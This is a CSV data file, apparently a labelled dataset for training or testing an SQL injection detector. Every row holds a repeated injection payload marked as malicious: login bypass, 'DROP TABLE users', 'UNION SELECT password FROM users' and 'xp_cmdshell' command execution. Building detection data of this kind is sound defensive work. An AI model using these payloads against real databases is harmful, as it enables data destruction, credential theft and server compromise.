query,label
admin'--,1
admin'--,1
' OR 'x'='x'; --,1
1 OR 1=1,1
' OR '1'='1,1
' OR 'x'='x'; --,1
' OR 'x'='x'; --,1
1 OR 1=1,1
'; EXEC xp_cmdshell('dir'); --,1
1 OR 1=1,1
admin'--,1
UNION SELECT password FROM users,1
'; EXEC xp_cmdshell('dir'); --,1
admin'--,1
'; DROP TABLE users; --,1
'; DROP TABLE users; --,1
' OR 'x'='x'; --,1
'; EXEC xp_cmdshell('dir'); --,1
'; DROP TABLE users; --,1
admin'--,1
'; EXEC xp_cmdshell('dir'); --,1
1 OR 1=1,1
'; EXEC xp_cmdshell('dir'); --,1
UNION SELECT password FROM users,1
'; EXEC xp_cmdshell('dir'); --,1
admin'--,1
admin'--,1
'; DROP TABLE users; --,1
'; DROP TABLE users; --,1
' OR 'x'='x'; --,1
' OR '1'='1,1
'; DROP TABLE users; --,1
' OR '1'='1,1
' OR 'x'='x'; --,1
""" OR 1=1 --",1
UNION SELECT password FROM users,1
' OR 'x'='x'; --,1
'; DROP TABLE users; --,1
admin'--,1
UNION SELECT password FROM users,1
admin'--,1
""" OR 1=1 --",1
1 OR 1=1,1
admin'--,1
' OR '1'='1,1
'; DROP TABLE users; --,1
'; EXEC xp_cmdshell('dir'); --,1
admin'--,1
'; EXEC xp_cmdshell('dir'); --,1
' OR 'x'='x'; --,1
1 OR 1=1,1
1 OR 1=1,1
'; DROP TABLE users; --,1
UNION SELECT password FROM users,1
1 OR 1=1,1
' OR 'x'='x'; --,1
' OR '1'='1,1
' OR '1'='1,1
1 OR 1=1,1
UNION SELECT password FROM users,1
'; EXEC xp_cmdshell('dir'); --,1
admin'--,1
""" OR 1=1 --",1
' OR '1'='1,1
' OR '1'='1,1
' OR '1'='1,1
""" OR 1=1 --",1
1 OR 1=1,1
1 OR 1=1,1
1 OR 1=1,1
'; EXEC xp_cmdshell('dir'); --,1
'; DROP TABLE users; --,1
'; DROP TABLE users; --,1
1 OR 1=1,1
""" OR 1=1 --",1
""" OR 1=1 --",1
'; DROP TABLE users; --,1
""" OR 1=1 --",1
'; DROP TABLE users; --,1
UNION SELECT password FROM users,1
1 OR 1=1,1
' OR 'x'='x'; --,1
""" OR 1=1 --",1
' OR '1'='1,1
' OR '1'='1,1
""" OR 1=1 --",1
1 OR 1=1,1
admin'--,1
admin'--,1
' OR '1'='1,1
' OR '1'='1,1
admin'--,1
' OR 'x'='x'; --,1
UNION SELECT password FROM users,1
' OR 'x'='x'; --,1
'; DROP TABLE users; --,1
UNION SELECT password FROM users,1
' OR 'x'='x'; --,1
'; DROP TABLE users; --,1
admin'--,1
1 OR 1=1,1
' OR 'x'='x'; --,1
'; EXEC xp_cmdshell('dir'); --,1
UNION SELECT password FROM users,1
' OR 'x'='x'; --,1
""" OR 1=1 --",1
admin'--,1
' OR 'x'='x'; --,1
""" OR 1=1 --",1
'; DROP TABLE users; --,1
'; EXEC xp_cmdshell('dir'); --,1
'; EXEC xp_cmdshell('dir'); --,1
1 OR 1=1,1
' OR '1'='1,1
' OR '1'='1,1
' OR '1'='1,1
admin'--,1
""" OR 1=1 --",1
'; DROP TABLE users; --,1
admin'--,1
""" OR 1=1 --",1
1 OR 1=1,1
""" OR 1=1 --",1
'; DROP TABLE users; --,1
' OR 'x'='x'; --,1
' OR 'x'='x'; --,1
admin'--,1
' OR '1'='1,1
' OR 'x'='x'; --,1
1 OR 1=1,1
'; EXEC xp_cmdshell('dir'); --,1
admin'--,1
'; EXEC xp_cmdshell('dir'); --,1
' OR '1'='1,1
